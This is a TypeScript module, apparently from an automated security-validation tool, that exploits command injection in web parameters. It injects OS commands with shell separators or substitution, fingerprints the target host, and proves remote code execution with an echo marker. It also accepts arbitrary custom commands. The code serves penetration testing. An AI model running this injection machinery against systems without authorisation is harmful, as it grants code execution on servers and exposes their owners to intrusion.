/**
 * Command Injection Post-Exploitation Module
 * 
 * Proves RCE capability by executing benign commands and capturing output.
 * Uses only read-only, non-destructive commands.
 */

import { createHash } from "crypto";
import { ValidatingHttpClient, type ValidationContext } from "../../validation/validating-http-client";

/**
 * Safely strip HTML tags by looping until no changes occur.
 * This prevents bypass via nested tags like <scr<script>ipt>
 */
function stripHtmlTags(input: string): string {
  const tagPattern = /<[^>]+>/g;
  let result = input;
  let previous: string;
  
  // Loop until no more tags are found (handles nested/malformed tags)
  do {
    previous = result;
    result = result.replace(tagPattern, "");
  } while (result !== previous);
  
  return result;
}

export interface CommandInjectionExploitConfig {
  targetUrl: string;
  parameterName: string;
  parameterLocation: "url_param" | "body_param";
  httpMethod: "GET" | "POST";
  injectionPayload: string;
  detectedOs: "unix" | "windows" | "unknown";
  headers?: Record<string, string>;
}

export interface CommandExecutionResult {
  command: string;
  executed: boolean;
  output?: string;
  exitCode?: number;
  executionTimeMs: number;
}

export interface SystemFingerprint {
  os: "linux" | "unix" | "windows" | "macos" | "unknown";
  kernel?: string;
  hostname?: string;
  currentUser?: string;
  workingDirectory?: string;
  confidence: number;
}

export interface CommandInjectionPostExploitResult {
  success: boolean;
  systemFingerprint?: SystemFingerprint;
  commandResults: CommandExecutionResult[];
  rceProven: boolean;
  evidence: string;
  proofArtifacts: ProofArtifact[];
  executionTimeMs: number;
}

interface ProofArtifact {
  type: string;
  description: string;
  data: string;
  hash: string;
  capturedAt: Date;
}

const SAFE_UNIX_COMMANDS = [
  { cmd: "id", description: "User identity", expectedPattern: /uid=\d+.*gid=\d+/ },
  { cmd: "whoami", description: "Current user", expectedPattern: /\w+/ },
  { cmd: "hostname", description: "System hostname", expectedPattern: /\w+/ },
  { cmd: "pwd", description: "Working directory", expectedPattern: /^\// },
  { cmd: "uname -a", description: "System info", expectedPattern: /Linux|Darwin|BSD/ },
  { cmd: "echo OdinForge-$(date +%s)", description: "Proof of execution", expectedPattern: /OdinForge-\d+/ },
];

const SAFE_WINDOWS_COMMANDS = [
  { cmd: "whoami", description: "Current user", expectedPattern: /\\/ },
  { cmd: "hostname", description: "System hostname", expectedPattern: /\w+/ },
  { cmd: "echo OdinForge-%TIME%", description: "Proof of execution", expectedPattern: /OdinForge-\d+:\d+/ },
  { cmd: "cd", description: "Working directory", expectedPattern: /[A-Z]:\\/ },
  { cmd: "ver", description: "Windows version", expectedPattern: /Microsoft Windows/ },
];

export class CommandInjectionPostExploitModule {
  private httpClient: ValidatingHttpClient;
  private context?: ValidationContext;
  
  constructor(context?: ValidationContext) {
    this.httpClient = new ValidatingHttpClient({ timeout: 15000 });
    this.context = context;
  }
  
  async executeCommand(
    config: CommandInjectionExploitConfig, 
    command: string
  ): Promise<CommandExecutionResult> {
    const startTime = Date.now();
    const payload = this.buildCommandPayload(config.injectionPayload, command, config.detectedOs);
    
    const url = new URL(config.targetUrl);
    let requestUrl = url.toString();
    let body: string | undefined;
    const headers: Record<string, string> = { ...config.headers };
    
    if (config.parameterLocation === "url_param") {
      url.searchParams.set(config.parameterName, payload);
      requestUrl = url.toString();
    } else {
      body = `${config.parameterName}=${encodeURIComponent(payload)}`;
      headers["Content-Type"] = "application/x-www-form-urlencoded";
    }
    
    try {
      const { response } = await this.httpClient.request({
        method: config.httpMethod,
        url: requestUrl,
        headers,
        body,
      }, this.context);
      
      const output = this.extractCommandOutput(response.body, command);
      const executed = output !== null && output.length > 0;
      
      return {
        command,
        executed,
        output: output || undefined,
        executionTimeMs: Date.now() - startTime,
      };
    } catch {
      return {
        command,
        executed: false,
        executionTimeMs: Date.now() - startTime,
      };
    }
  }
  
  async fingerprintSystem(config: CommandInjectionExploitConfig): Promise<SystemFingerprint> {
    const fingerprint: SystemFingerprint = {
      os: "unknown",
      confidence: 0,
    };
    
    // Try id command (Unix)
    const idResult = await this.executeCommand(config, "id");
    if (idResult.executed && idResult.output?.match(/uid=\d+/)) {
      fingerprint.os = idResult.output.includes("Darwin") ? "macos" : "linux";
      fingerprint.confidence = 95;
      
      const userMatch = idResult.output.match(/uid=\d+\((\w+)\)/);
      fingerprint.currentUser = userMatch?.[1];
    }
    
    // Try whoami
    const whoamiResult = await this.executeCommand(config, "whoami");
    if (whoamiResult.executed && whoamiResult.output) {
      if (whoamiResult.output.includes("\\")) {
        fingerprint.os = "windows";
        fingerprint.confidence = 90;
        fingerprint.currentUser = whoamiResult.output.split("\\").pop()?.trim();
      } else if (!fingerprint.currentUser) {
        fingerprint.currentUser = whoamiResult.output.trim();
      }
    }
    
    // Try hostname
    const hostnameResult = await this.executeCommand(config, "hostname");
    if (hostnameResult.executed && hostnameResult.output) {
      fingerprint.hostname = hostnameResult.output.trim();
      fingerprint.confidence = Math.max(fingerprint.confidence, 70);
    }
    
    // Try uname -a (Unix) or ver (Windows)
    if (fingerprint.os !== "windows") {
      const unameResult = await this.executeCommand(config, "uname -a");
      if (unameResult.executed && unameResult.output) {
        fingerprint.kernel = unameResult.output.trim();
        if (unameResult.output.includes("Linux")) fingerprint.os = "linux";
        else if (unameResult.output.includes("Darwin")) fingerprint.os = "macos";
        fingerprint.confidence = 95;
      }
    } else {
      const verResult = await this.executeCommand(config, "ver");
      if (verResult.executed && verResult.output?.includes("Windows")) {
        fingerprint.kernel = verResult.output.trim();
        fingerprint.confidence = 95;
      }
    }
    
    // Try pwd/cd for working directory
    const pwdCmd = fingerprint.os === "windows" ? "cd" : "pwd";
    const pwdResult = await this.executeCommand(config, pwdCmd);
    if (pwdResult.executed && pwdResult.output) {
      fingerprint.workingDirectory = pwdResult.output.trim();
    }
    
    return fingerprint;
  }
  
  async proveRce(config: CommandInjectionExploitConfig): Promise<CommandExecutionResult> {
    const timestamp = Math.floor(Date.now() / 1000);
    const proofMarker = `OdinForge-AEV-${timestamp}`;
    
    const cmd = config.detectedOs === "windows"
      ? `echo ${proofMarker}`
      : `echo "${proofMarker}"`;
    
    const result = await this.executeCommand(config, cmd);
    
    if (result.output?.includes(proofMarker)) {
      return {
        ...result,
        executed: true,
      };
    }
    
    return result;
  }
  
  async runFullExploitation(
    config: CommandInjectionExploitConfig,
    options: {
      skipFingerprint?: boolean;
      maxCommands?: number;
      customCommands?: string[];
    } = {}
  ): Promise<CommandInjectionPostExploitResult> {
    const startTime = Date.now();
    const proofArtifacts: ProofArtifact[] = [];
    const evidence: string[] = [];
    const commandResults: CommandExecutionResult[] = [];
    
    // Step 1: System Fingerprinting
    let systemFingerprint: SystemFingerprint | undefined;
    if (!options.skipFingerprint) {
      systemFingerprint = await this.fingerprintSystem(config);
      if (systemFingerprint.confidence > 0) {
        evidence.push(`OS: ${systemFingerprint.os}, User: ${systemFingerprint.currentUser || "unknown"}`);
        proofArtifacts.push({
          type: "system_fingerprint",
          description: "System identification via command execution",
          data: JSON.stringify(systemFingerprint),
          hash: createHash("sha256").update(JSON.stringify(systemFingerprint)).digest("hex"),
          capturedAt: new Date(),
        });
      }
    }
    
    // Step 2: RCE Proof
    const rceProof = await this.proveRce(config);
    commandResults.push(rceProof);
    
    const rceProven = rceProof.executed && (rceProof.output?.includes("OdinForge-AEV") ?? false);
    
    if (rceProven) {
      evidence.push(`RCE proven with marker: ${rceProof.output?.trim()}`);
      proofArtifacts.push({
        type: "rce_proof",
        description: "Remote code execution proof with unique marker",
        data: rceProof.output || "",
        hash: createHash("sha256").update(rceProof.output || "").digest("hex"),
        capturedAt: new Date(),
      });
    }
    
    // Step 3: Execute additional commands
    const safeCommands = config.detectedOs === "windows" 
      ? SAFE_WINDOWS_COMMANDS 
      : SAFE_UNIX_COMMANDS;
    
    const maxCommands = options.maxCommands || 5;
    const commandsToRun = options.customCommands || safeCommands.slice(0, maxCommands).map(c => c.cmd);
    
    for (const cmd of commandsToRun) {
      if (cmd.includes("echo") && cmd.includes("OdinForge")) continue;
      
      const result = await this.executeCommand(config, cmd);
      commandResults.push(result);
      
      if (result.executed) {
        const cmdInfo = safeCommands.find(c => c.cmd === cmd);
        evidence.push(`${cmd}: ${result.output?.substring(0, 50) || "executed"}`);
        
        if (cmdInfo) {
          proofArtifacts.push({
            type: "command_output",
            description: cmdInfo.description,
            data: result.output || "",
            hash: createHash("sha256").update(result.output || "").digest("hex"),
            capturedAt: new Date(),
          });
        }
      }
    }
    
    const executedCommands = commandResults.filter(r => r.executed).length;
    const success = rceProven || executedCommands > 0;
    
    return {
      success,
      systemFingerprint: systemFingerprint?.confidence ? systemFingerprint : undefined,
      commandResults,
      rceProven,
      evidence: evidence.join("; "),
      proofArtifacts,
      executionTimeMs: Date.now() - startTime,
    };
  }
  
  // ---------------------------------------------------------------------------
  // Private Helpers
  // ---------------------------------------------------------------------------
  
  private buildCommandPayload(basePayload: string, command: string, os: string): string {
    const separator = os === "windows" ? "&" : ";";
    const terminator = os === "windows" ? "" : " #";
    
    if (basePayload.includes("$(")) {
      return basePayload.replace("$()", `$(${command})`);
    }
    
    if (basePayload.includes("`")) {
      return basePayload.replace("``", `\`${command}\``);
    }
    
    return `${basePayload}${separator}${command}${terminator}`;
  }
  
  private extractCommandOutput(responseBody: string, command: string): string | null {
    const preMatch = responseBody.match(/<pre[^>]*>([\s\S]*?)<\/pre>/i);
    if (preMatch) {
      return stripHtmlTags(preMatch[1]).trim();
    }
    
    const codeMatch = responseBody.match(/<code[^>]*>([\s\S]*?)<\/code>/i);
    if (codeMatch) {
      return stripHtmlTags(codeMatch[1]).trim();
    }
    
    const jsonMatch = responseBody.match(/"output"\s*:\s*"([^"]+)"/);
    if (jsonMatch) {
      return jsonMatch[1];
    }
    
    const cmdInfo = [...SAFE_UNIX_COMMANDS, ...SAFE_WINDOWS_COMMANDS]
      .find(c => c.cmd === command);
    
    if (cmdInfo) {
      const match = responseBody.match(cmdInfo.expectedPattern);
      if (match) {
        const startIdx = match.index!;
        const endIdx = responseBody.indexOf("\n", startIdx + 1);
        return responseBody.substring(startIdx, endIdx > startIdx ? endIdx : startIdx + 100).trim();
      }
    }
    
    return null;
  }
}
